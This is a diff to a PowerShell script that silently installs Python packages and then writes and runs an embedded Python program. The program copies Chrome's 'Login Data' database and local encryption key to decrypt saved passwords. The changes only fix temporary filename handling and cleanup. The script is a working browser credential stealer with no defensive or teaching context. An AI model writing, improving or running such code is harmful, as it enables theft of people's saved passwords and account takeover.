@@ -1,16 +1,16 @@
 $ErrorActionPreference = 'Stop'
 
-# 1. Check Python installation
+# 1. Check Python
 try { python --version >$null 2>&1 } catch { 
     Write-Host "⚠️ Install Python first: https://python.org"
     exit 
 }
 
-# 2. Install required packages
+# 2. Install requirements
 python -m pip install --upgrade pip >$null 2>&1
 python -m pip install pycryptodome pypiwin32 requests >$null 2>&1
 
-# 3. Python script with ALL required imports
+# 3. Python script with fixed filename handling
 $pythonCode = @'
 import os
 import json
@@ -20,6 +20,7 @@ import win32crypt
 from Crypto.Cipher import AES
 import shutil
 from datetime import datetime, timedelta
+import uuid
 
 def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
@@ -38,6 +39,9 @@ def decrypt_password(password, key):
 
 def main():
     try:
+        # Generate random filename in Python
+        filename = f"ChromeData_{uuid.uuid4().hex}.db"
+        
         local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                       "Google", "Chrome", 
                                       "User Data", "Local State")
@@ -50,7 +54,6 @@ def main():
         db_path = os.path.join(os.environ["LOCALAPPDATA"], 
                              "Google", "Chrome", 
                              "User Data", "default", "Login Data")
-        filename = "ChromeData_$([System.Guid]::NewGuid()).db"
         shutil.copyfile(db_path, filename)
         
         db = sqlite3.connect(filename)
@@ -77,7 +80,8 @@ def main():
         try:
             cursor.close()
             db.close()
-            os.remove(filename)
+            if os.path.exists(filename):
+                os.remove(filename)
         except:
             pass
 
@@ -85,8 +89,8 @@ if __name__ == "__main__":
     main()
 '@
 
-# 4. Execute with proper cleanup
-$tempFile = "$env:TEMP\chrome_passwords_$([System.Guid]::NewGuid()).py"
+# 4. Execute with cleanup
+$tempFile = "$env:TEMP\chrome_passwords.py"
 try {
     [System.IO.File]::WriteAllText($tempFile, $pythonCode)
     python $tempFile
